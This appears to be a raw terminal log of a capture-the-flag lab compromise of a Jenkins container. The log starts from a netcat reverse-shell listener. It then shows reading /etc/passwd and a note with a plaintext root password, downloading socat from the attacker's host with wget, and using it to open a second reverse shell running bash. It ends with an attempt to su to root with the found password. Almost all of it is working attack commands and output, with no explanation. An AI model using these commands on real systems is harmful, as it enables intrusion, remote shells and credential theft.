
```sh
┌──(kali㉿kali)-[~/thm/internal]
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.23.44] 53764
pwd
/
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
python3 -c 'imprt pty;pty.spawn("/bin/bash")'
/bin/bash: line 3: python3: command not found
cd home
ls
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
ls -la
total 8
drwxr-xr-x 2 root root 4096 Sep  8  2019 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
cd ..
ls -la
total 84
drwxr-xr-x   1 root root 4096 Aug  3  2020 .
drwxr-xr-x   1 root root 4096 Aug  3  2020 ..
-rwxr-xr-x   1 root root    0 Aug  3  2020 .dockerenv
drwxr-xr-x   1 root root 4096 Aug  3  2020 bin
drwxr-xr-x   2 root root 4096 Sep  8  2019 boot
drwxr-xr-x   5 root root  340 Aug  1 11:29 dev
drwxr-xr-x   1 root root 4096 Aug  3  2020 etc
drwxr-xr-x   2 root root 4096 Sep  8  2019 home
drwxr-xr-x   1 root root 4096 Jan 30  2020 lib
drwxr-xr-x   2 root root 4096 Jan 30  2020 lib64
drwxr-xr-x   2 root root 4096 Jan 30  2020 media
drwxr-xr-x   2 root root 4096 Jan 30  2020 mnt
drwxr-xr-x   1 root root 4096 Aug  3  2020 opt
dr-xr-xr-x 117 root root    0 Aug  1 11:29 proc
drwx------   1 root root 4096 Aug  3  2020 root
drwxr-xr-x   3 root root 4096 Jan 30  2020 run
drwxr-xr-x   1 root root 4096 Jul 28  2020 sbin
drwxr-xr-x   2 root root 4096 Jan 30  2020 srv
dr-xr-xr-x  13 root root    0 Aug  1 11:29 sys
drwxrwxrwt   1 root root 4096 Aug  1 11:30 tmp
drwxr-xr-x   1 root root 4096 Jan 30  2020 usr
drwxr-xr-x   1 root root 4096 Jul 28  2020 var
ls -la /opt
total 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
su root
su: must be run from a terminal
ss -tulpn
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
tcp    LISTEN     0      50        *:50000                 *:*                   users:(("java",pid=6,fd=342))
tcp    LISTEN     0      50        *:8080                  *:*                   users:(("java",pid=6,fd=148))
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
jenkins      1  0.0  0.0   1148     4 ?        Ss   11:29   0:00 /sbin/tini -- /usr/local/bin/jenkins.sh
jenkins      6  2.9 17.2 2602796 351856 ?      Sl   11:29   1:12 java -Duser.home=/var/jenkins_home -Djenkins.model.Jenkins.slaveAgentPort=50000 -jar /usr/share/jenkins/jenkins.war
jenkins     11  0.0  0.0      0     0 ?        Z    11:29   0:00 [jenkins.sh] <defunct>
jenkins     96  0.0  0.1  19708  3204 ?        S    12:01   0:00 /bin/bash
jenkins     98  0.0  0.1  19708  3172 ?        S    12:02   0:00 /bin/bash
jenkins    111  0.0  0.1  38384  3060 ?        R    12:11   0:00 ps aux
cat /proc/version
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
which nc
which bash
/bin/bash
which curl
/usr/bin/curl
which perl
/usr/bin/perl
which wget
/usr/bin/wget
wget 10.18.21.236/tools/socat
--2024-08-01 12:24:43--  http://10.18.21.236/tools/socat
Connecting to 10.18.21.236:80... failed: Connection refused.
wget 10.18.21.236:8000/tools/socat
--2024-08-01 12:26:16--  http://10.18.21.236:8000/tools/socat
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2024-08-01 12:26:16 ERROR 404: File not found.


wget 10.18.21.236:8000/tools/socat
--2024-08-01 12:27:25--  http://10.18.21.236:8000/tools/socat
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
socat: Permission denied

Cannot write to ‘socat’ (Permission denied).
pwd
/
ls -la
total 84
drwxr-xr-x   1 root root 4096 Aug  3  2020 .
drwxr-xr-x   1 root root 4096 Aug  3  2020 ..
-rwxr-xr-x   1 root root    0 Aug  3  2020 .dockerenv
drwxr-xr-x   1 root root 4096 Aug  3  2020 bin
drwxr-xr-x   2 root root 4096 Sep  8  2019 boot
drwxr-xr-x   5 root root  340 Aug  1 11:29 dev
drwxr-xr-x   1 root root 4096 Aug  3  2020 etc
drwxr-xr-x   2 root root 4096 Sep  8  2019 home
drwxr-xr-x   1 root root 4096 Jan 30  2020 lib
drwxr-xr-x   2 root root 4096 Jan 30  2020 lib64
drwxr-xr-x   2 root root 4096 Jan 30  2020 media
drwxr-xr-x   2 root root 4096 Jan 30  2020 mnt
drwxr-xr-x   1 root root 4096 Aug  3  2020 opt
dr-xr-xr-x 117 root root    0 Aug  1 11:29 proc
drwx------   1 root root 4096 Aug  3  2020 root
drwxr-xr-x   3 root root 4096 Jan 30  2020 run
drwxr-xr-x   1 root root 4096 Jul 28  2020 sbin
drwxr-xr-x   2 root root 4096 Jan 30  2020 srv
dr-xr-xr-x  13 root root    0 Aug  1 12:05 sys
drwxrwxrwt   1 root root 4096 Aug  1 11:30 tmp
drwxr-xr-x   1 root root 4096 Jan 30  2020 usr
drwxr-xr-x   1 root root 4096 Jul 28  2020 var
cd tmp
wget 10.18.21.236:8000/tools/socat
--2024-08-01 12:28:52--  http://10.18.21.236:8000/tools/socat
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’

     0K .......... .......... .......... .......... .......... 13%  635K 0s
    50K .......... .......... .......... .......... .......... 27% 1.21M 0s
   100K .......... .......... .......... .......... .......... 40% 8.19M 0s
   150K .......... .......... .......... .......... .......... 54% 1.43M 0s
   200K .......... .......... .......... .......... .......... 68% 8.26M 0s
   250K .......... .......... .......... .......... .......... 81% 11.6M 0s
   300K .......... .......... .......... .......... .......... 95% 66.0M 0s
   350K .......... ......                                     100% 16.6M=0.2s

2024-08-01 12:28:52 (2.09 MB/s) - ‘socat’ saved [375176/375176]

./socat TCP:10.18.21.236:444 EXEC:"bash -li"
/bin/bash: line 30: ./socat: Permission denied
./socat TCP:10.18.21.236:4000 EXEC:"bash -li"
/bin/bash: line 31: ./socat: Permission denied
chmod +x socat
ls -la
total 9680
drwxrwxrwt 1 root    root       4096 Aug  1 12:28 .
drwxr-xr-x 1 root    root       4096 Aug  3  2020 ..
drwxr-xr-x 2 jenkins jenkins    4096 Aug  1 11:29 hsperfdata_jenkins
drwxr-xr-x 2 root    root       4096 Feb  2  2020 hsperfdata_root
drwxr-xr-x 2 jenkins jenkins    4096 Aug  1 11:29 jetty-0_0_0_0-8080-war-_-any-231164104216414970.dir
drwxr-xr-x 2 jenkins jenkins    4096 Aug  3  2020 jetty-0_0_0_0-8080-war-_-any-2385313934447407628.dir
-rwxr-xr-x 1 jenkins jenkins  375176 Aug  1 12:22 socat
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 winstone4805797399595250733.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 winstone7166027169177973699.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  1 11:29 winstone901576704038411058.jar
./socat TCP:10.18.21.236:4000 EXEC:"bash -li"
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/tmp$ pwd

pwd
jenkins@jenkins:/tmp$ su
su: must be run from a terminal
jenkins@jenkins:/tmp$ su root
su: must be run from a terminal
jenkins@jenkins:/tmp$ whichwhich python
jenkins@jenkins:/tmp$ exit
logout
/tmp
pwd
/bin/bash: line 37: whichpwd: command not found
pwd
/tmp
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
jenkins@jenkins:/tmp$ ls
ls
hsperfdata_jenkins
hsperfdata_root
jetty-0_0_0_0-8080-war-_-any-231164104216414970.dir
jetty-0_0_0_0-8080-war-_-any-2385313934447407628.dir
socat
winstone4805797399595250733.jar
winstone7166027169177973699.jar
winstone901576704038411058.jar
jenkins@jenkins:/tmp$ ls -la
ls -la
total 9680
drwxrwxrwt 1 root    root       4096 Aug  1 12:28 .
drwxr-xr-x 1 root    root       4096 Aug  3  2020 ..
drwxr-xr-x 2 jenkins jenkins    4096 Aug  1 11:29 hsperfdata_jenkins
drwxr-xr-x 2 root    root       4096 Feb  2  2020 hsperfdata_root
drwxr-xr-x 2 jenkins jenkins    4096 Aug  1 11:29 jetty-0_0_0_0-8080-war-_-any-231164104216414970.dir
drwxr-xr-x 2 jenkins jenkins    4096 Aug  3  2020 jetty-0_0_0_0-8080-war-_-any-2385313934447407628.dir
-rwxr-xr-x 1 jenkins jenkins  375176 Aug  1 12:22 socat
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 winstone4805797399595250733.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 winstone7166027169177973699.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  1 11:29 winstone901576704038411058.jar
jenkins@jenkins:/tmp$ su root
su root
Password: tr0ub13guM!@#123

su: Authentication failure
jenkins@jenkins:/tmp$ ^Z  
zsh: suspended  nc -nvlp 443
                                                                                                                              
┌──(kali㉿kali)-[~/thm/internal]
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 443

jenkins@jenkins:/tmp$ ls -la
total 9680
drwxrwxrwt 1 root    root       4096 Aug  1 12:28 .
drwxr-xr-x 1 root    root       4096 Aug  3  2020 ..
drwxr-xr-x 2 jenkins jenkins    4096 Aug  1 11:29 hsperfdata_jenkins
drwxr-xr-x 2 root    root       4096 Feb  2  2020 hsperfdata_root
drwxr-xr-x 2 jenkins jenkins    4096 Aug  1 11:29 jetty-0_0_0_0-8080-war-_-any-231164104216414970.dir
drwxr-xr-x 2 jenkins jenkins    4096 Aug  3  2020 jetty-0_0_0_0-8080-war-_-any-2385313934447407628.dir
-rwxr-xr-x 1 jenkins jenkins  375176 Aug  1 12:22 socat
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 winstone4805797399595250733.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  3  2020 winstone7166027169177973699.jar
-rw-r--r-- 1 jenkins jenkins 3167976 Aug  1 11:29 winstone901576704038411058.jar
jenkins@jenkins:/tmp$ 
```

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123